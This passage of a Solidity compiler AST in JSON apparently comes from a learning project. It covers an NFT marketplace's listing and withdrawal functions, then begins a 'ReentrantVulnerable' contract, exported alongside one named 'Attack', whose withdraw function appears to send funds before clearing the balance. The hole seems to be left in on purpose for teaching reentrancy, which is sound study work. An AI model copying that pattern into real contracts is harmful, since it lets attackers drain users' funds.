ref"}},"id":2968,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberName":"price","nodeType":"MemberAccess","referencedDeclaration":2629,"src":"3865:37:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":2969,"name":"newPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2940,"src":"3905:8:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"3865:48:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2971,"nodeType":"ExpressionStatement","src":"3865:48:11"},{"eventCall":{"arguments":[{"expression":{"id":2973,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"3939:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":2974,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"3939:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2975,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2936,"src":"3951:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2976,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2938,"src":"3963:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2977,"name":"newPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2940,"src":"3972:8:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2972,"name":"ItemListed","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2642,"src":"3928:10:11","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256,uint256)"}},"id":2978,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"3928:53:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2979,"nodeType":"EmitStatement","src":"3923:58:11"}]},"functionSelector":"f772adf1","id":2981,"implemented":true,"kind":"function","modifiers":[{"arguments":[{"id":2943,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2936,"src":"3678:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2944,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2938,"src":"3690:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2945,"kind":"modifierInvocation","modifierName":{"id":2942,"name":"isListed","nodeType":"IdentifierPath","referencedDeclaration":2727,"src":"3669:8:11"},"nodeType":"ModifierInvocation","src":"3669:29:11"},{"id":2947,"kind":"modifierInvocation","modifierName":{"id":2946,"name":"nonReentrant","nodeType":"IdentifierPath","referencedDeclaration":29,"src":"3707:12:11"},"nodeType":"ModifierInvocation","src":"3707:12:11"},{"arguments":[{"id":2949,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2936,"src":"3736:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2950,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2938,"src":"3748:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"id":2951,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"3757:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":2952,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"3757:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"id":2953,"kind":"modifierInvocation","modifierName":{"id":2948,"name":"isOwner","nodeType":"IdentifierPath","referencedDeclaration":2759,"src":"3728:7:11"},"nodeType":"ModifierInvocation","src":"3728:40:11"}],"name":"updateListing","nameLocation":"3545:13:11","nodeType":"FunctionDefinition","parameters":{"id":2941,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2936,"mutability":"mutable","name":"nftAddress","nameLocation":"3576:10:11","nodeType":"VariableDeclaration","scope":2981,"src":"3568:18:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2935,"name":"address","nodeType":"ElementaryTypeName","src":"3568:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2938,"mutability":"mutable","name":"tokenId","nameLocation":"3604:7:11","nodeType":"VariableDeclaration","scope":2981,"src":"3596:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2937,"name":"uint256","nodeType":"ElementaryTypeName","src":"3596:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2940,"mutability":"mutable","name":"newPrice","nameLocation":"3629:8:11","nodeType":"VariableDeclaration","scope":2981,"src":"3621:16:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2939,"name":"uint256","nodeType":"ElementaryTypeName","src":"3621:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3558:85:11"},"returnParameters":{"id":2954,"nodeType":"ParameterList","parameters":[],"src":"3773:0:11"},"scope":3055,"src":"3536:452:11","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"body":{"id":3024,"nodeType":"Block","src":"4031:285:11","statements":[{"assignments":[2985],"declarations":[{"constant":false,"id":2985,"mutability":"mutable","name":"proceeds","nameLocation":"4049:8:11","nodeType":"VariableDeclaration","scope":3024,"src":"4041:16:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2984,"name":"uint256","nodeType":"ElementaryTypeName","src":"4041:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2990,"initialValue":{"baseExpression":{"id":2986,"name":"s_proceeds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2671,"src":"4060:10:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":2989,"indexExpression":{"expression":{"id":2987,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"4071:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":2988,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"4071:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"4060:22:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"4041:41:11"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2993,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2991,"name":"proceeds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2985,"src":"4096:8:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<=","rightExpression":{"hexValue":"30","id":2992,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4108:1:11","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"4096:13:11","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2998,"nodeType":"IfStatement","src":"4092:63:11","trueBody":{"id":2997,"nodeType":"Block","src":"4111:44:11","statements":[{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":2994,"name":"NoProceeds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2619,"src":"4132:10:11","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$__$","typeString":"function () pure"}},"id":2995,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4132:12:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2996,"nodeType":"RevertStatement","src":"4125:19:11"}]}},{"expression":{"id":3004,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":2999,"name":"s_proceeds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2671,"src":"4164:10:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":3002,"indexExpression":{"expression":{"id":3000,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"4175:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":3001,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"4175:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"4164:22:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"30","id":3003,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4189:1:11","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"4164:26:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3005,"nodeType":"ExpressionStatement","src":"4164:26:11"},{"assignments":[3007,null],"declarations":[{"constant":false,"id":3007,"mutability":"mutable","name":"success","nameLocation":"4206:7:11","nodeType":"VariableDeclaration","scope":3024,"src":"4201:12:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":3006,"name":"bool","nodeType":"ElementaryTypeName","src":"4201:4:11","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},null],"id":3018,"initialValue":{"arguments":[{"hexValue":"","id":3016,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"4261:2:11","typeDescriptions":{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""},"value":""}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""}],"expression":{"arguments":[{"expression":{"id":3010,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"4227:3:11","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":3011,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"4227:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":3009,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4219:8:11","typeDescriptions":{"typeIdentifier":"t_type$_t_address_payable_$","typeString":"type(address payable)"},"typeName":{"id":3008,"name":"address","nodeType":"ElementaryTypeName","src":"4219:8:11","stateMutability":"payable","typeDescriptions":{}}},"id":3012,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4219:19:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address_payable","typeString":"address payable"}},"id":3013,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"call","nodeType":"MemberAccess","src":"4219:24:11","typeDescriptions":{"typeIdentifier":"t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$","typeString":"function (bytes memory) payable returns (bool,bytes memory)"}},"id":3015,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"names":["value"],"nodeType":"FunctionCallOptions","options":[{"id":3014,"name":"proceeds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2985,"src":"4251:8:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"src":"4219:41:11","typeDescriptions":{"typeIdentifier":"t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value","typeString":"function (bytes memory) payable returns (bool,bytes memory)"}},"id":3017,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4219:45:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_bytes_memory_ptr_$","typeString":"tuple(bool,bytes memory)"}},"nodeType":"VariableDeclarationStatement","src":"4200:64:11"},{"expression":{"arguments":[{"id":3020,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3007,"src":"4282:7:11","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"5472616e73666572206661696c6564","id":3021,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"4291:17:11","typeDescriptions":{"typeIdentifier":"t_stringliteral_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51","typeString":"literal_string \"Transfer failed\""},"value":"Transfer failed"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51","typeString":"literal_string \"Transfer failed\""}],"id":3019,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"4274:7:11","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":3022,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"4274:35:11","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3023,"nodeType":"ExpressionStatement","src":"4274:35:11"}]},"functionSelector":"9038e693","id":3025,"implemented":true,"kind":"function","modifiers":[],"name":"withdrawProceeds","nameLocation":"4003:16:11","nodeType":"FunctionDefinition","parameters":{"id":2982,"nodeType":"ParameterList","parameters":[],"src":"4019:2:11"},"returnParameters":{"id":2983,"nodeType":"ParameterList","parameters":[],"src":"4031:0:11"},"scope":3055,"src":"3994:322:11","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"body":{"id":3041,"nodeType":"Block","src":"4440:55:11","statements":[{"expression":{"baseExpression":{"baseExpression":{"id":3035,"name":"s_listings","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2667,"src":"4457:10:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$_$","typeString":"mapping(address => mapping(uint256 => struct NftMarketplace.Listing storage ref))"}},"id":3037,"indexExpression":{"id":3036,"name":"nftAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3027,"src":"4468:10:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"4457:22:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Listing_$2632_storage_$","typeString":"mapping(uint256 => struct NftMarketplace.Listing storage ref)"}},"id":3039,"indexExpression":{"id":3038,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3029,"src":"4480:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"4457:31:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage","typeString":"struct NftMarketplace.Listing storage ref"}},"functionReturnParameters":3034,"id":3040,"nodeType":"Return","src":"4450:38:11"}]},"functionSelector":"88700d1c","id":3042,"implemented":true,"kind":"function","modifiers":[],"name":"getListing","nameLocation":"4331:10:11","nodeType":"FunctionDefinition","parameters":{"id":3030,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3027,"mutability":"mutable","name":"nftAddress","nameLocation":"4359:10:11","nodeType":"VariableDeclaration","scope":3042,"src":"4351:18:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":3026,"name":"address","nodeType":"ElementaryTypeName","src":"4351:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":3029,"mutability":"mutable","name":"tokenId","nameLocation":"4387:7:11","nodeType":"VariableDeclaration","scope":3042,"src":"4379:15:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3028,"name":"uint256","nodeType":"ElementaryTypeName","src":"4379:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4341:59:11"},"returnParameters":{"id":3034,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3033,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3042,"src":"4424:14:11","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_memory_ptr","typeString":"struct NftMarketplace.Listing"},"typeName":{"id":3032,"nodeType":"UserDefinedTypeName","pathNode":{"id":3031,"name":"Listing","nodeType":"IdentifierPath","referencedDeclaration":2632,"src":"4424:7:11"},"referencedDeclaration":2632,"src":"4424:7:11","typeDescriptions":{"typeIdentifier":"t_struct$_Listing_$2632_storage_ptr","typeString":"struct NftMarketplace.Listing"}},"visibility":"internal"}],"src":"4423:16:11"},"scope":3055,"src":"4322:173:11","stateMutability":"view","virtual":false,"visibility":"external"},{"body":{"id":3053,"nodeType":"Block","src":"4570:42:11","statements":[{"expression":{"baseExpression":{"id":3049,"name":"s_proceeds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2671,"src":"4587:10:11","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":3051,"indexExpression":{"id":3050,"name":"seller","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3044,"src":"4598:6:11","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"4587:18:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3048,"id":3052,"nodeType":"Return","src":"4580:25:11"}]},"functionSelector":"30cfeda9","id":3054,"implemented":true,"kind":"function","modifiers":[],"name":"getProceeds","nameLocation":"4510:11:11","nodeType":"FunctionDefinition","parameters":{"id":3045,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3044,"mutability":"mutable","name":"seller","nameLocation":"4530:6:11","nodeType":"VariableDeclaration","scope":3054,"src":"4522:14:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":3043,"name":"address","nodeType":"ElementaryTypeName","src":"4522:7:11","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"4521:16:11"},"returnParameters":{"id":3048,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3047,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3054,"src":"4561:7:11","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3046,"name":"uint256","nodeType":"ElementaryTypeName","src":"4561:7:11","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4560:9:11"},"scope":3055,"src":"4501:111:11","stateMutability":"view","virtual":false,"visibility":"external"}],"scope":3056,"src":"525:4089:11","usedErrors":[2599,2611,2617,2619,2621,2623,2625]}],"src":"32:4583:11"},"id":11},"contracts/sub/ReentrantVulnerable.sol":{"ast":{"absolutePath":"contracts/sub/ReentrantVulnerable.sol","exportedSymbols":{"Attack":[3195],"ReentrantVulnerable":[3118]},"id":3196,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":3057,"literals":["solidity","^","0.8",".7"],"nodeType":"PragmaDirective","src":"32:23:12"},{"abstract":false,"baseContracts":[],"contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":3118,"linearizedBaseContracts":[3118],"name":"ReentrantVulnerable","nameLocation":"66:19:12","nodeType":"ContractDefinition","nodes":[{"constant":false,"functionSelector":"27e235e3","id":3061,"mutability":"mutable","name":"balances","nameLocation":"127:8:12","nodeType":"VariableDeclaration","scope":3118,"src":"92:43:12","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"},"typeName":{"id":3060,"keyType":{"id":3058,"name":"address","nodeType":"ElementaryTypeName","src":"100:7:12","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Mapping","src":"92:27:12","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"},"valueType":{"id":3059,"name":"uint256","nodeType":"ElementaryTypeName","src":"111:7:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}},"visibility":"public"},{"body":{"id":3072,"nodeType":"Block","src":"176:50:12","statements":[{"expression":{"id":3070,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":3064,"name":"balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3061,"src":"186:8:12","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":3067,"indexExpression":{"expression":{"id":3065,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"195:3:12","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":3066,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"195:10:12","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"186:20:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"expression":{"id":3068,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"210:3:12","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":3069,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"value","nodeType":"MemberAccess","src":"210:9:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"186:33:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3071,"nodeType":"ExpressionStatement","src":"186:33:12"}]},"functionSelector":"d0e30db0","id":3073,"implemented":true,"kind":"function","modifiers":[],"name":"deposit","nameLocation":"151:7:12","nodeType":"FunctionDefinition","parameters":{"id":3062,"nodeType":"ParameterList","parameters":[],"src":"158:2:12"},"returnParameters":{"id":3063,"nodeType":"ParameterList","parameters":[],"src":"176:0:12"},"scope":3118,"src":"142:84:12","stateMutability":"payable","virtual":false,"visibility":"public"},{"body":{"id":3104,"nodeType":"Block","src":"259:182:12","statements":[{"assignments":[3077],"declarations":[{"constant":false,"id":3077,"mutability":"mutable","name":"bal","nameLocation":"277:3:12","nodeType":"VariableDeclaration","scope":3104,"src":"269:11:12","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3076,"name":"uint256","nodeType":"ElementaryTypeName","src":"269:7:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":3082,"initialValue":{"baseExpression":{"id":3078,"name":"balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3061,"src":"283:8:12","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":3081,"indexExpression":{"expression":{"id":3079,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"292:3:12","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":3080,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"292:10:12","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"283:20:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"269:34:12"},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3086,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3084,"name":"bal","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3077,"src":"321:3:12","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":3085,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"327:1:12","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"321:7:12","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"id":3083,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"313:7:12","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$returns$__$","typeString":"function (bool) pure"}},"id":3087,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"313:16:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":3088,"nodeType":"ExpressionStatement","src":"313:16:12"},{"assignments":[3090,null],"declarations":[{"constant":false,"id":3090,"mutability":"mutable","name":"sent","nameLocation":"345:4:12","nodeType":"VariableDeclaration","scope":3104,"src":"340:9:12","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":3089,"name":"bool","nodeType":"ElementaryTypeName","src":"340:4:12","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},null],"id":3098,"initialValue":{"arguments":[{"hexValue":"","id":3096,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"383:2:12","typeDescriptions":{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""},"value":""}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string 